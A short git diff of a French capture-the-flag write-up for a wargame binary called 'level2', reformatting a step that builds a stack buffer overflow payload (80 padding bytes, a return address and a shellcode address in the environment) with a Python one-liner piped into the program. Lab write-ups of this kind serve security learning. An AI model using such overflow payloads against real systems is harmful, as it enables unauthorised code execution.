@@ -81,7 +81,8 @@ Même réflexes que pour les levels précédents :
       > 0xbffff869
 
 - Dans la VM (hors gdb), on passe dans l'entrée standard du programme 80 caractères (76 + 4 pour overflow le buffer), suivi de l'adresse de ret puis l'adresse du shellcode stocké dans l'env.
-`(python -c 'print("A"*80+"\x3e\x85\x04\x08"+"\x69\xf8\xff\xbf")'; cat ) | ./level2
+  
+`(python -c 'print("A"*80+"\x3e\x85\x04\x08"+"\x69\xf8\xff\xbf")'; cat ) | ./level2`
 
 ```
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>i���`
